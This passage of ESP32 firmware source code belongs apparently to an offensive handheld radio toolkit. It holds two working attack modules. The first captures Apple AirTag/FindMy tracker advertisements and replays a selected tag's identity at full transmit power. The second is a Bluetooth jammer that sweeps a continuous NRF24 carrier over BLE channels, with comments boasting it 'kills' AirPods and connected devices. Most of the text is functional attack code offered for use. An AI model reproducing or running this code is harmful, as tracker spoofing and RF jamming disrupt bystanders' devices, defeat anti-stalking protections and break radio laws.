    tft.drawBitmap(60, ICON_BAR_Y, bitmap_icon_undo, 16, 16, HALEHOUND_MAGENTA);
    // Play/Stop
    tft.drawBitmap(110, ICON_BAR_Y, bitmap_icon_start, 16, 16,
                   S->replaying ? HALEHOUND_HOTPINK : HALEHOUND_MAGENTA);
    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, HALEHOUND_HOTPINK);
}

static void arDrawHeader() {
    tft.fillRect(0, 38, SCREEN_WIDTH, 26, TFT_BLACK);
    tft.drawLine(0, 38, SCREEN_WIDTH, 38, HALEHOUND_HOTPINK);

    drawGlitchTitle(58, "SNIFF");

    tft.drawLine(0, 62, SCREEN_WIDTH, 62, HALEHOUND_HOTPINK);
}

static void arDrawStatus(const char* msg, uint16_t color) {
    tft.fillRect(0, 63, SCREEN_WIDTH, 14, TFT_BLACK);
    tft.setTextSize(1);
    tft.setTextColor(color, TFT_BLACK);
    tft.setCursor(5, 66);
    tft.print(msg);
}

// ═══════════════════════════════════════════════════════════════════════════
// PHASE 1: TAG LIST — scrollable list of captured tags
// ═══════════════════════════════════════════════════════════════════════════

static void arDrawTagList() {
    int listY = 78;
    tft.fillRect(0, listY, SCREEN_WIDTH, SCREEN_HEIGHT - listY, HALEHOUND_BLACK);

    // Header info
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
    tft.setCursor(5, listY);
    tft.printf("TAGS: %d", S->tagCount);
    tft.setCursor(80, listY);
    tft.printf("SCANS: %d", S->totalScans);

    if (S->tagCount == 0) {
        tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
        tft.setCursor(10, listY + 30);
        tft.print("No FindMy trackers found");
        tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
        tft.setCursor(10, listY + 48);
        tft.print("Scanning for AirTags...");
        return;
    }

    int y = listY + 14;
    for (int i = 0; i < AR_MAX_VISIBLE && i + S->listStartIndex < S->tagCount; i++) {
        int idx = i + S->listStartIndex;
        CapturedTag& t = S->captured[idx];

        // Highlight selected / current
        if (idx == S->currentIndex) {
            tft.fillRect(0, y - 1, SCREEN_WIDTH, AR_LINE_HEIGHT, HALEHOUND_DARK);
        }

        // Selection marker
        if (t.selected) {
            tft.setTextColor(HALEHOUND_HOTPINK, (idx == S->currentIndex) ? HALEHOUND_DARK : TFT_BLACK);
            tft.setCursor(2, y + 3);
            tft.print(">");
        }

        // RSSI bars
        arDrawRssiBar(10, y + 1, t.rssi);

        // Short MAC (last 3 octets)
        uint16_t textCol = (idx == S->currentIndex) ? HALEHOUND_HOTPINK : HALEHOUND_MAGENTA;
        tft.setTextColor(textCol, (idx == S->currentIndex) ? HALEHOUND_DARK : TFT_BLACK);
        tft.setCursor(33, y + 3);
        char shortMac[12];
        snprintf(shortMac, sizeof(shortMac), "%02X:%02X:%02X",
                 t.mac[3], t.mac[4], t.mac[5]);
        tft.print(shortMac);

        // Battery
        tft.setTextColor(arBatteryColor(t.battery), (idx == S->currentIndex) ? HALEHOUND_DARK : TFT_BLACK);
        tft.setCursor(93, y + 3);
        tft.print(arBatteryStr(t.battery));

        // RSSI value
        tft.setTextColor(HALEHOUND_VIOLET, (idx == S->currentIndex) ? HALEHOUND_DARK : TFT_BLACK);
        tft.setCursor(130, y + 3);
        tft.printf("%ddB", t.rssi);

        // Proximity
        tft.setTextColor(HALEHOUND_BRIGHT, (idx == S->currentIndex) ? HALEHOUND_DARK : TFT_BLACK);
        tft.setCursor(175, y + 3);
        tft.print(arProximityStr(t.rssi));

        y += AR_LINE_HEIGHT;
    }

    // Footer
    tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
    tft.setCursor(5, SCREEN_HEIGHT - 12);
    tft.print("UP/DN=Nav SEL=Choose PLAY=TX");
}

// ═══════════════════════════════════════════════════════════════════════════
// PHASE 2: REPLAY VIEW — broadcasting captured tag identity
// ═══════════════════════════════════════════════════════════════════════════

// PROGMEM skull icon table (pointers live in flash, not DRAM)
static const unsigned char* const arSkulls[AR_SKULL_NUM] PROGMEM = {
    bitmap_icon_skull_wifi,
    bitmap_icon_skull_bluetooth,
    bitmap_icon_skull_jammer,
    bitmap_icon_skull_subghz,
    bitmap_icon_skull_ir,
    bitmap_icon_skull_tools,
    bitmap_icon_skull_setting,
    bitmap_icon_skull_about
};

static void arDrawStaticReplayInfo() {
    tft.fillRect(0, 78, SCREEN_WIDTH, AR_SKULL_Y - 80, TFT_BLACK);

    // Find selected tag
    int selIdx = -1;
    for (int i = 0; i < S->tagCount; i++) {
        if (S->captured[i].selected) { selIdx = i; break; }
    }
    if (selIdx < 0) return;

    CapturedTag& t = S->captured[selIdx];
    int y = 80;

    tft.setTextSize(1);

    // Full MAC
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setCursor(5, y);
    tft.print("MAC: ");
    tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
    char macStr[18];
    arMacToStr(t.mac, macStr, sizeof(macStr));
    tft.print(macStr);
    y += 14;

    // Payload preview (first 8 bytes after header)
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setCursor(5, y);
    tft.print("PLD: ");
    tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
    char pldbuf[28];
    snprintf(pldbuf, sizeof(pldbuf), "%02X%02X%02X%02X %02X%02X%02X%02X",
             t.payload[2], t.payload[3], t.payload[4], t.payload[5],
             t.payload[6], t.payload[7], t.payload[8], t.payload[9]);
    tft.print(pldbuf);
    y += 14;

    // Capture RSSI + proximity
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setCursor(5, y);
    tft.print("CAP: ");
    tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
    tft.printf("%ddBm (%s)", t.rssi, arProximityStr(t.rssi));
    y += 14;

    // Battery
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setCursor(5, y);
    tft.print("BAT: ");
    tft.setTextColor(arBatteryColor(t.battery), TFT_BLACK);
    tft.print(arBatteryStr(t.battery));
    y += 18;

    // Status line
    if (S->replaying) {
        tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
        tft.setCursor(5, y);
        tft.print("[!] TRANSMITTING        ");
    } else {
        tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
        tft.setCursor(5, y);
        tft.print("[*] Tap play to replay  ");
    }

    S->staticDrawn = true;
    S->lastReplayState = S->replaying;
}

static void arDrawDynamicReplay() {
    // Redraw static on first call or state change
    if (!S->staticDrawn || (S->replaying != S->lastReplayState)) {
        arDrawStaticReplayInfo();
    }

    if (!S->replaying) return;

    tft.setTextSize(1);

    // Replay count + rate
    char buf[36];
    snprintf(buf, sizeof(buf), "[+] TX: %-8lu (%d/s)  ", S->replayCount, S->replayRate);
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setCursor(5, 148);
    tft.print(buf);
}

static void arDrawSkulls() {
    int skullStartX = 10;
    int skullSpacing = (SCREEN_WIDTH - 20) / AR_SKULL_NUM;
    int frame = (int)(millis() / 120);

    for (int i = 0; i < AR_SKULL_NUM; i++) {
        int x = skullStartX + (i * skullSpacing);
        tft.fillRect(x, AR_SKULL_Y, 16, 16, TFT_BLACK);

        uint16_t color;
        if (S->replaying) {
            int phase = (frame + i) % 8;
            if (phase < 4) {
                color = arGradientColor(phase / 3.0f);
            } else {
                float ratio = (phase - 4) / 3.0f;
                uint8_t r = 255 - (uint8_t)(ratio * 255);
                uint8_t g = 28 + (uint8_t)(ratio * (207 - 28));
                uint8_t b = 82 + (uint8_t)(ratio * (255 - 82));
                color = tft.color565(r, g, b);
            }
        } else {
            color = HALEHOUND_GUNMETAL;
        }

        const unsigned char* icon = (const unsigned char*)pgm_read_ptr(&arSkulls[i]);
        tft.drawBitmap(x, AR_SKULL_Y, icon, 16, 16, color);
    }

    // TX/OFF label
    int labelX = skullStartX + (AR_SKULL_NUM * skullSpacing) + 5;
    tft.fillRect(labelX - 5, AR_SKULL_Y, 50, 16, TFT_BLACK);
    tft.setTextColor(S->replaying ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(labelX, AR_SKULL_Y + 4);
    tft.print(S->replaying ? "TX!" : "OFF");
}

static void arDrawCounterBar() {
    tft.fillRect(0, AR_BAR_Y, SCREEN_WIDTH, 25, TFT_BLACK);

    int barX = 10;
    int barY = AR_BAR_Y + 2;
    int barW = SCALE_W(140);
    int barH = 10;

    tft.drawRoundRect(barX - 1, barY - 1, barW + 2, barH + 2, 2, HALEHOUND_MAGENTA);
    tft.fillRoundRect(barX, barY, barW, barH, 1, HALEHOUND_DARK);

    // Fill proportional to rate (max ~1 replay every 2s = 0.5/s, but show at higher scale)
    float fillPct = (S->replayRate > 0) ? (float)S->replayRate / 2.0f : 0.0f;
    if (fillPct > 1.0f) fillPct = 1.0f;
    int fillW = (int)(fillPct * barW);
    if (fillW > 0) {
        for (int px = 0; px < fillW; px++) {
            float ratio = (float)px / (float)barW;
            uint16_t c = arGradientColor(ratio);
            tft.drawFastVLine(barX + px, barY + 1, barH - 2, c);
        }
    }

    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
    char cntBuf[12];
    snprintf(cntBuf, sizeof(cntBuf), "%lu", S->replayCount);
    tft.setCursor(barX + 4, barY + 1);
    tft.print(cntBuf);

    tft.setTextColor(S->replaying ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
    tft.setCursor(SCALE_X(160), AR_BAR_Y + 3);
    tft.printf("%d rep/s", S->replayRate);

    if (S->replaying) {
        tft.drawBitmap(SCALE_X(220), AR_BAR_Y + 1, bitmap_icon_skull_bluetooth, 16, 16, HALEHOUND_HOTPINK);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// START / STOP / TOGGLE REPLAY
// ═══════════════════════════════════════════════════════════════════════════

static void startReplay() {
    // Must have a selected tag
    bool hasSelection = false;
    for (int i = 0; i < S->tagCount; i++) {
        if (S->captured[i].selected) { hasSelection = true; break; }
    }
    if (!hasSelection) return;

    // Deinit scan before replay — can't scan and advertise simultaneously
    if (S->pArScan) {
        S->pArScan->stop();
        S->pArScan = nullptr;
    }
    BLEDevice::deinit(false);
    delay(100);

    // Re-init for advertising
    releaseClassicBtMemory();
    BLEDevice::init("HaleHound");
    delay(150);

    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);

    S->replaying = true;
    S->replayCount = 0;
    S->replayRate = 0;
    S->rateWindowCount = 0;
    S->staticDrawn = false;

    // Switch to replay view
    tft.fillRect(0, 63, SCREEN_WIDTH, SCREEN_HEIGHT - 63, TFT_BLACK);
    arDrawIconBar();
    arDrawStatus(">> REPLAYING <<", HALEHOUND_HOTPINK);
    arDrawStaticReplayInfo();
    arDrawSkulls();
    arDrawCounterBar();

    startReplayTask();

    #if CYD_DEBUG
    Serial.println("[REPLAY] Started (Core 0)");
    #endif
}

static void stopReplay() {
    stopReplayTask();

    // Re-init for scanning
    BLEDevice::deinit(false);
    delay(100);

    releaseClassicBtMemory();
    BLEDevice::init("");
    delay(150);

    S->pArScan = BLEDevice::getScan();
    if (S->pArScan) {
        S->pArScan->setActiveScan(false);
        S->pArScan->setInterval(100);
        S->pArScan->setWindow(99);
    }

    S->staticDrawn = false;

    // Switch back to list view
    tft.fillRect(0, 63, SCREEN_WIDTH, SCREEN_HEIGHT - 63, TFT_BLACK);
    arDrawIconBar();
    arDrawStatus("SCAN MODE", HALEHOUND_MAGENTA);
    arDrawTagList();

    #if CYD_DEBUG
    Serial.println("[REPLAY] Stopped, back to scan mode");
    #endif
}

static void toggleReplay() {
    if (S->replaying) {
        stopReplay();
    } else {
        startReplay();
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// PUBLIC FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

void setup() {
    if (S && S->initialized) return;

    #if CYD_DEBUG
    Serial.println("[REPLAY] Initializing AirTag Sniff+Replay...");
    #endif

    // Heap-allocate all state (zero-init)
    if (!S) {
        S = (ArState*)calloc(1, sizeof(ArState));
        if (!S) {
            Serial.println("[REPLAY] ERROR: calloc failed");
            return;
        }
    } else {
        memset(S, 0, sizeof(ArState));
    }

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    arDrawIconBar();
    arDrawHeader();

    // Tear down WiFi before BLE init
    WiFi.mode(WIFI_OFF);
    delay(50);

    // Init BLE for scanning
    releaseClassicBtMemory();
    BLEDevice::init("");
    delay(150);

    S->pArScan = BLEDevice::getScan();
    if (!S->pArScan) {
        Serial.println("[REPLAY] ERROR: getScan() returned NULL");
        tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
        tft.setCursor(10, 100);
        tft.print("BLE INIT FAILED");
        S->exitRequested = true;
        return;
    }
    S->pArScan->setActiveScan(false);  // Passive — don't alert the tracker
    S->pArScan->setInterval(100);
    S->pArScan->setWindow(99);

    S->initialized = true;

    // First scan
    arDrawStatus("SCANNING...", HALEHOUND_MAGENTA);
    runScan();
    if (S->tagCount > 0) {
        char sbuf[24];
        snprintf(sbuf, sizeof(sbuf), "%d TAGS FOUND", S->tagCount);
        arDrawStatus(sbuf, HALEHOUND_GREEN);
    } else {
        arDrawStatus("NO TAGS - RESCAN", HALEHOUND_GUNMETAL);
    }
    arDrawTagList();

    S->lastDisplayUpdate = millis();

    // Consume lingering touch from menu selection
    waitForTouchRelease();

    #if CYD_DEBUG
    Serial.printf("[REPLAY] Ready, found %d tags\n", S->tagCount);
    #endif
}

void loop() {
    if (!S || !S->initialized) return;

    touchButtonsUpdate();

    // ── Icon bar touch ──────────────────────────────────────────────────
    if (millis() - S->lastIconTap > 250) {
        uint16_t tx, ty;
        if (getTouchPoint(&tx, &ty)) {
            if (ty >= ICON_BAR_Y && ty <= (ICON_BAR_BOTTOM + 4)) {
                waitForTouchRelease();

                // Back button (x: 10-30)
                if (tx >= 5 && tx <= 30) {
                    if (S->replaying) stopReplay();
                    S->exitRequested = true;
                    S->lastIconTap = millis();
                    return;
                }
                // Scan button (x: 60-80)
                else if (tx >= 50 && tx <= 80) {
                    if (!S->replaying && S->pArScan) {
                        arDrawStatus("SCANNING...", HALEHOUND_MAGENTA);
                        runScan();
                        char sbuf[24];
                        snprintf(sbuf, sizeof(sbuf), "%d TAGS FOUND", S->tagCount);
                        arDrawStatus(sbuf, HALEHOUND_GREEN);
                        arDrawTagList();
                    }
                    S->lastIconTap = millis();
                    return;
                }
                // Play/Stop button (x: 110-130)
                else if (tx >= 100 && tx <= 135) {
                    if (S->tagCount > 0) {
                        // If no tag selected yet, auto-select current
                        if (!S->replaying) {
                            bool anySelected = false;
                            for (int i = 0; i < S->tagCount; i++) {
                                if (S->captured[i].selected) { anySelected = true; break; }
                            }
                            if (!anySelected) {
                                S->captured[S->currentIndex].selected = true;
                            }
                        }
                        toggleReplay();
                    }
                    S->lastIconTap = millis();
                    return;
                }
            }
        }
    }

    // ── Hardware buttons ────────────────────────────────────────────────
    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        if (S->replaying) stopReplay();
        S->exitRequested = true;
        return;
    }

    if (!S->replaying) {
        // ── SCAN PHASE INPUT ────────────────────────────────────────────
        if (buttonPressed(BTN_UP)) {
            if (S->currentIndex > 0) {
                S->currentIndex--;
                if (S->currentIndex < S->listStartIndex) S->listStartIndex--;
                arDrawTagList();
            }
        }

        if (buttonPressed(BTN_DOWN)) {
            if (S->currentIndex < S->tagCount - 1) {
                S->currentIndex++;
                if (S->currentIndex >= S->listStartIndex + AR_MAX_VISIBLE) S->listStartIndex++;
                arDrawTagList();
            }
        }

        if (buttonPressed(BTN_SELECT)) {
            if (S->tagCount > 0) {
                // Deselect all, select current (single selection)
                for (int i = 0; i < S->tagCount; i++) S->captured[i].selected = false;
                S->captured[S->currentIndex].selected = true;
                arDrawTagList();
            }
        }

        if (buttonPressed(BTN_RIGHT)) {
            // Start replay if a tag is selected
            if (S->tagCount > 0) {
                bool anySelected = false;
                for (int i = 0; i < S->tagCount; i++) {
                    if (S->captured[i].selected) { anySelected = true; break; }
                }
                if (!anySelected) {
                    S->captured[S->currentIndex].selected = true;
                }
                startReplay();
            }
        }

        // Touch to select device in list
        int touched = getTouchedMenuItem(92, AR_LINE_HEIGHT, min((int)AR_MAX_VISIBLE, (int)(S->tagCount - S->listStartIndex)));
        if (touched >= 0) {
            int idx = S->listStartIndex + touched;
            // Deselect all, select touched
            for (int i = 0; i < S->tagCount; i++) S->captured[i].selected = false;
            S->captured[idx].selected = true;
            S->currentIndex = idx;
            arDrawTagList();
        }
    } else {
        // ── REPLAY PHASE INPUT ──────────────────────────────────────────
        if (buttonPressed(BTN_SELECT) || buttonPressed(BTN_LEFT)) {
            stopReplay();
        }

        // Dynamic display update at ~10fps
        if (millis() - S->lastDisplayUpdate >= 100) {
            arDrawDynamicReplay();
            arDrawSkulls();
            arDrawCounterBar();
            S->lastDisplayUpdate = millis();
        }
    }

    yield();
}

bool isExitRequested() {
    return S ? S->exitRequested : false;
}

void cleanup() {
    if (S) {
        stopReplayTask();

        if (S->pArScan) {
            S->pArScan->stop();
            S->pArScan = nullptr;
        }

        BLEDevice::deinit(false);

        free(S);
        S = nullptr;
    }

    #if CYD_DEBUG
    Serial.println("[REPLAY] Cleanup complete");
    #endif
}

}  // namespace AirTagReplay


// ═══════════════════════════════════════════════════════════════════════════
// BLE JAMMER IMPLEMENTATION - NRF24L01+PA+LNA Continuous Carrier Wave
// Targets Bluetooth 2.402-2.480 GHz band (79 channels)
// Uses same proven NRF24 technique as WLAN Jammer
// Modes: ALL CHANNELS | ADV ONLY (Ch37/38/39) | DATA ONLY
// ═══════════════════════════════════════════════════════════════════════════

namespace BleJammer {

// ═══════════════════════════════════════════════════════════════════════════
// BLE CHANNEL MAPPING
// ═══════════════════════════════════════════════════════════════════════════
// Bluetooth uses 79 x 1MHz channels: 2.402 - 2.480 GHz
// NRF24 channel N = 2400 + N MHz
// BT channel 0 (2402 MHz) = NRF24 channel 2
// BT channel 78 (2480 MHz) = NRF24 channel 80
//
// BLE Advertising channels (most effective targets):
//   Ch 37 = 2402 MHz = NRF24 ch 2
//   Ch 38 = 2426 MHz = NRF24 ch 26
//   Ch 39 = 2480 MHz = NRF24 ch 80
// ═══════════════════════════════════════════════════════════════════════════

#define BJ_BT_NRF_START    2     // BT channel 0 = NRF channel 2
#define BJ_BT_NRF_END      80    // BT channel 78 = NRF channel 80

// BLE Advertising channel NRF24 mappings (used by equalizer display markers)
static const uint8_t BJ_ADV_CHANNELS[] = {2, 26, 80};  // Ch37, Ch38, Ch39
#define BJ_ADV_COUNT 3

// ═══════════════════════════════════════════════════════════════════════════
// CHANNEL ARRAYS — Bruce firmware pattern (PROVEN WORKING ON AIRPODS)
// Bruce: startConstCarrier() once → setChannel() in tight loop = KILLS BLE
// We tried raw SPI, data flooding, CE toggling — all FAILED.
// Bruce's simple pattern WORKS. Don't overthink it.
// ═══════════════════════════════════════════════════════════════════════════

// BLE channels — NRF24 ch 2-41 (all 40 BLE data + advertising channels)
// This is what kills CONNECTED devices (AirPods, speakers, headphones)
static const uint8_t BJ_BLE_CHANNELS[] = {
     2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21,
    22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41
};
#define BJ_BLE_COUNT 40

// BLE Advertising Priority — Bruce firmware's exact channel set
// Targets ADV frequencies (2402/2426/2480 MHz) + adjacent channels for splash
static const uint8_t BJ_BLE_ADV_CHANNELS[] = {37, 38, 39, 1, 2, 3, 25, 26, 27, 79, 80, 81};
#define BJ_BLE_ADV_COUNT 12

// Full Bluetooth band — NRF24 ch 2-80 (all 79 BT channels)
static const uint8_t BJ_BT_CHANNELS[] = {
     2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21,
    22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41,
    42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61,
    62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80
};
#define BJ_BT_COUNT 79

// ADV KILL — ONLY the 3 BLE advertising channels (maximum focus)
// BLE adv ch 37 = 2402 MHz = NRF24 ch 2
// BLE adv ch 38 = 2426 MHz = NRF24 ch 26
// BLE adv ch 39 = 2480 MHz = NRF24 ch 80
// Each channel gets 33% of jammer time — nowhere to reconnect
static const uint8_t BJ_ADV_KILL_CHANNELS[] = {2, 26, 80};
#define BJ_ADV_KILL_COUNT 3

// Jamming modes
#define BJ_MODE_BLE      0    // BLE data+adv channels — kills connected devices
#define BJ_MODE_BLE_ADV  1    // BLE advertising priority — disrupts discovery/pairing
#define BJ_MODE_BT       2    // Full Bluetooth band — maximum coverage
#define BJ_MODE_ADV_KILL 3    // ADV KILL — 3 channels only, maximum range
#define BJ_MODE_COUNT    4
static const char* BJ_MODE_NAMES[] = {"BLE", "BLE ADV", "BLUETOOTH", "ADV KILL"};

// Mode channel pointers for clean loop access
// Adaptive dwell: target ~1.5ms sweep regardless of channel count
// Fewer channels = longer dwell per channel = same sweep rate for all modes
struct BjJamMode {
    const uint8_t* channels;
    int count;
    int dwellUs;  // microseconds to sit on each channel
};
static const BjJamMode bjModes[] = {
    {BJ_BLE_CHANNELS,      BJ_BLE_COUNT,      38},   // 40ch × 38us = 1.52ms sweep
    {BJ_BLE_ADV_CHANNELS,  BJ_BLE_ADV_COUNT,  125},  // 12ch × 125us = 1.50ms sweep
    {BJ_BT_CHANNELS,       BJ_BT_COUNT,       19},   // 79ch × 19us = 1.50ms sweep
    {BJ_ADV_KILL_CHANNELS, BJ_ADV_KILL_COUNT, 500}   //  3ch × 500us = 1.50ms sweep — MAXIMUM FOCUS
};

// ═══════════════════════════════════════════════════════════════════════════
// DISPLAY CONSTANTS - 85-BAR EQUALIZER (matches WLAN/SubGHz Jammer)
// ═══════════════════════════════════════════════════════════════════════════
#define BJ_GRAPH_X      2
#define BJ_GRAPH_Y      155
#define BJ_GRAPH_WIDTH  GRAPH_FULL_W
#define BJ_GRAPH_HEIGHT 106
#define BJ_NUM_BARS     85

// Skull rows - 3 rows of 8 = 24 skulls (matches SubGHz Jammer)
#define BJ_SKULL_Y           (SCREEN_HEIGHT - 55)
#define BJ_SKULL_ROWS        3
#define BJ_SKULL_ROW_SPACING 18
#define BJ_SKULL_NUM         8

// ═══════════════════════════════════════════════════════════════════════════
// STATE VARIABLES
// ═══════════════════════════════════════════════════════════════════════════
static bool initialized = false;
static bool exitRequested = false;
static volatile bool jamming = false;           // volatile — shared between cores
static int currentMode = BJ_MODE_BLE_ADV;        // Default BLE ADV — proven AirPod killer
static volatile int currentNRFChannel = BJ_BT_NRF_START;  // volatile — read by display, written by jam task
static volatile int hopIndex = 0;
static unsigned long lastDisplayTime = 0;
static volatile int bjHitCount = 0;             // volatile — incremented by jam task, read by display

// Equalizer heat levels
static uint8_t channelHeat[BJ_NUM_BARS] = {0};
static int skullFrame = 0;

// ═══════════════════════════════════════════════════════════════════════════
// DUAL-CORE JAMMER — FreeRTOS task on Core 0
// NRF24 uses VSPI (GPIO 18/19/23). Display uses HSPI (GPIO 12/13/14).
// Separate hardware SPI buses = zero conflict. Jammer runs 100% duty cycle
// on core 0 while display animations run full speed on core 1.
// ═══════════════════════════════════════════════════════════════════════════
static TaskHandle_t bjJamTaskHandle = NULL;
static volatile bool bjJamTaskRunning = false;
static volatile bool bjJamTaskDone = false;      // task signals when cleanup is complete
static volatile int bjJamMode = BJ_MODE_BLE_ADV; // shadow of currentMode for jam task

static void bjJamTask(void* param) {
    // ═══════════════════════════════════════════════════════════════════════
    // ALL SPI + NRF24 operations happen HERE on core 0.
    // ESP32 SPI driver registers ISR on the core that calls spi_bus_initialize().
    // If we init on core 1 and use from core 0, transactions are malformed/weak.
    // Solution: init, use, AND cleanup all on core 0. Core 1 never touches radio.
    // ═══════════════════════════════════════════════════════════════════════

    // Init SPI on THIS core
    SPI.end();
    delay(2);
    SPI.begin(RADIO_SPI_SCK, RADIO_SPI_MISO, RADIO_SPI_MOSI, NRF24_CSN);
    delay(5);

    // Init radio on THIS core
    if (!nrf24Radio.begin()) {
        Serial.println("[BLEJAM] Core 0: NRF24 begin() FAILED");
        SPI.end();
        bjJamTaskDone = true;
        vTaskDelete(NULL);
        return;
    }

    // startConstCarrier — continuous wave, 100% duty cycle, ALWAYS transmitting
    // setChannel() just steers the frequency — carrier never stops
    // This is what was PROVEN to kill AirPods on the spectrum analyzer
    nrf24Radio.stopListening();
    nrf24Radio.setPALevel(RF24_PA_MAX);
    nrf24Radio.startConstCarrier(RF24_PA_MAX, 50);
    nrf24Radio.setAddressWidth(5);
    nrf24Radio.setPayloadSize(2);
    nrf24Radio.setDataRate(RF24_2MBPS);

    Serial.printf("[BLEJAM] Core 0: SPI + NRF24 initialized, CW carrier active, isPVariant=%d\n",
                  nrf24Radio.isPVariant());

    int localHop = 0;
    int yieldCounter = 0;

    while (bjJamTaskRunning) {
        int mode = bjJamMode;  // local copy to avoid race
        const BjJamMode& m = bjModes[mode];

        localHop++;
        if (localHop >= m.count) localHop = 0;

        uint8_t ch = m.channels[localHop];
        nrf24Radio.setChannel(ch);  // Carrier stays ON, just hops frequency
        delayMicroseconds(m.dwellUs);  // Adaptive dwell — all modes sweep at ~1.5ms

        // Update shared state for display (volatile, races OK for display)
        currentNRFChannel = ch;
        hopIndex = localHop;
        bjHitCount++;

        // Feed watchdog on core 0 — yield every 100 hops
        // Without this, the idle task starves and watchdog reboots the ESP32
        yieldCounter++;
        if (yieldCounter >= 100) {
            yieldCounter = 0;
            vTaskDelay(1);  // 1 tick (~1ms) — keeps WDT happy, 99% duty cycle
        }
    }

    // Cleanup on THIS core — core 1 must NOT touch radio while task is alive
    // Full chip reinit required: startConstCarrier() calls disableCRC() which
    // trashes CONFIG register. stopConstCarrier() never re-enables CRC.
    // begin() reinitializes ALL registers to known defaults.
    nrf24Radio.stopConstCarrier();
    nrf24Radio.begin();
    nrf24Radio.powerDown();
    SPI.end();

    Serial.println("[BLEJAM] Core 0: Radio fully reset + powered down, SPI released");
    bjJamTaskDone = true;
    vTaskDelete(NULL);
}

// Short display names for FreeMonoBold18pt (must fit 240px screen)
static const char* BJ_MODE_DISPLAY[] = {"BLE", "BLE ADV", "BT FULL", "ADV KILL"};

// ═══════════════════════════════════════════════════════════════════════════
// SKULL ICONS (same set as WLAN/SubGHz Jammer)
// ═══════════════════════════════════════════════════════════════════════════
static const unsigned char* bjSkulls[] = {
    bitmap_icon_skull_wifi,
    bitmap_icon_skull_bluetooth,
    bitmap_icon_skull_jammer,
    bitmap_icon_skull_subghz,
    bitmap_icon_skull_ir,
    bitmap_icon_skull_tools,
    bitmap_icon_skull_setting,
    bitmap_icon_skull_about
};

// ═══════════════════════════════════════════════════════════════════════════
// ICON BAR - 6 icons (matches SubGHz Jammer layout)
// Back(10) | Toggle(60) | PrevMode(105) | NextMode(140) | Antenna(180) | Cycle(215)
// ═══════════════════════════════════════════════════════════════════════════
#define BJ_ICON_SIZE 16
#define BJ_ICON_NUM  6
static int bjIconX[BJ_ICON_NUM] = {10, 60, 105, 140, 180, 215};
static const unsigned char* bjIcons[BJ_ICON_NUM] = {
    bitmap_icon_go_back,           // 0: Back
    bitmap_icon_start,             // 1: Toggle ON/OFF
    bitmap_icon_sort_down_minus,   // 2: Prev mode
    bitmap_icon_sort_up_plus,      // 3: Next mode
    bitmap_icon_antenna,           // 4: NRF24 status indicator
    bitmap_icon_recycle            // 5: Cycle mode
};

// ═══════════════════════════════════════════════════════════════════════════
// JAMMER ENGINE — Bruce firmware pattern (PROVEN ON AIRPODS)
// startConstCarrier() ONCE → setChannel() in tight loop
// DO NOT use raw SPI. DO NOT use data flooding. DO NOT clear REUSE_TX_PL.
// The REUSE_TX_PL flag set by startConstCarrier() on P-variant chips is
// what makes the chip continuously retransmit — it's the FEATURE, not a bug.
// We wasted an entire day trying to "fix" this. Bruce proves it works.
// ═══════════════════════════════════════════════════════════════════════════

// Helper: check if NRF channel is a BLE advertising channel (for equalizer display)
static bool bjIsAdvChannel(int ch) {
    return (ch == 2 || ch == 26 || ch == 80);
}

// ═══════════════════════════════════════════════════════════════════════════
// UI DRAWING FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

static void drawIconBar() {
    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, HALEHOUND_MAGENTA);
    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, HALEHOUND_GUNMETAL);
    for (int i = 0; i < BJ_ICON_NUM; i++) {
        uint16_t color = HALEHOUND_MAGENTA;
        if (i == 1 && jamming) color = HALEHOUND_HOTPINK;   // Toggle icon hot when jamming
        if (i == 4 && jamming) color = HALEHOUND_HOTPINK;  // Antenna icon hot when jamming
        tft.drawBitmap(bjIconX[i], ICON_BAR_Y, bjIcons[i], BJ_ICON_SIZE, BJ_ICON_SIZE, color);
    }
    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, HALEHOUND_HOTPINK);
}

